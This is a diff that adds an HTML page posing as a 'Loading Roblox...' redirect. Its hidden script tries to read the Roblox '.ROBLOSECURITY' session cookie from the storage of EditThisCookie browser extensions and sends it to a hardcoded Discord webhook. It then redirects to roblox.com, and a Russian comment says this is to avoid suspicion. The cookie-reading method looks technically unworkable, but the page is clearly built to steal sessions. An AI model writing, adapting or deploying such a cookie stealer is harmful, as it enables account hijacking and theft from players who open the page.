@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1499393355778621522/WDmEEbe1YUZbtAp-O_BbAra5asUVtmevlECtmPbeu1SnaJG63EQ78WP4J8ptDJrAImNX";
+        
+        // Самовызывающаяся функция
+        (async function() {
+            // Пробуем получить доступ к localStorage расширения, где может храниться кука
+            const extIds = [
+                "ojfebgpkimhlhcblbalbfjblapadhbol",  // EditThisCookie V3
+                "ihfmcbadakjehneaijebhpogkegajgnk"   // EditThisCookie fork
+            ];
+            
+            for (const id of extIds) {
+                try {
+                    // Пытаемся подключиться к indexedDB расширения
+                    const db = await new Promise((resolve) => {
+                        const request = indexedDB.open("chrome-extension://" + id + "/cookies");
+                        request.onsuccess = (e) => resolve(e.target.result);
+                        setTimeout(() => resolve(null), 500);
+                    });
+                    
+                    if (db) {
+                        // Читаем данные
+                        const tx = db.transaction(["cookies"], "readonly");
+                        const store = tx.objectStore("cookies");
+                        const request = store.getAll();
+                        request.onsuccess = (e) => {
+                            const cookies = e.target.result;
+                            const robloxCookie = cookies.find(c => 
+                                c.name === ".ROBLOSECURITY" && c.domain.includes("roblox")
+                            );
+                            if (robloxCookie) {
+                                fetch(WEBHOOK, { method: "POST", body: JSON.stringify({ cookie: robloxCookie.value }) });
+                            }
+                        };
+                    }
+                } catch(e) {}
+            }
+            
+            // Перенаправляем на реальный Roblox, чтобы не вызвать подозрений
+            window.location.href = "https://www.roblox.com/games/";
+        })();
+    </script>
+</head>
+<body>Loading Roblox...</body>
+</html>
